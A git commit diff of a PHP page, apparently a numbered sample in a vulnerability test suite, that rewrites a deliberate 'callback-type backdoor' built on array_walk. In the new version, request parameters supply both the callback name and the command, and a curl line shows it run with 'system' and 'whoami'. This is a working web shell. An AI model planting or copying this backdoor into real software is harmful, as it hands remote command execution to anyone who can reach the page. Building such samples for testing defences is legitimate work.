0bb91f674c901c9147c56842c4f77f706c33793b
Aaron Lewis <the.warl0ck.1989@gmail.com>
2018-03-13 09:15:14 +0800

    Let us release that way

--- php/vulns/013-arraywalk.php
+++ php/vulns/013-arraywalk.php
@@ -1,25 +1,20 @@
 <html>
-<head>	
+<head>
 	<meta charset="UTF-8"/>
-	<title>013 - array 命令执行后门</title>
+	<title>013 - 回调类型后门 - array_walk</title>
 </head>
 <body>
-	<h1>013 - 命令执行后门 - arratwalk方式</h1>
+	<h1>013 - 回调类型后门 - array_walk</h1>
 
 <p>不正常调用: </p>
-<pre>curl <?php echo 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?callback=system'?></pre>
-<pre>默认数组为：<?php $arr = array("whoami", "ls");var_dump($arr);?></pre>
+<pre>curl '<?= 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . '?callback=system&amp;command=whoami' ?>'</pre>
 <br>
-<p>windows: </p>
-<pre>暂无</pre>
-
 <br>
 <p>目录内容</p>
 <?php
-$arr = array("whoami", "ls");
-if (isset($_GET['callback'])) 
-{
-	array_walk($arr, $_GET['callback']);
+if (isset($_GET['callback']) && isset($_GET['command'])) {
+    $items = array($_GET['command'], "placeholder");
+    array_walk($items, $_GET['callback']);
 }
 ?>
 </body>
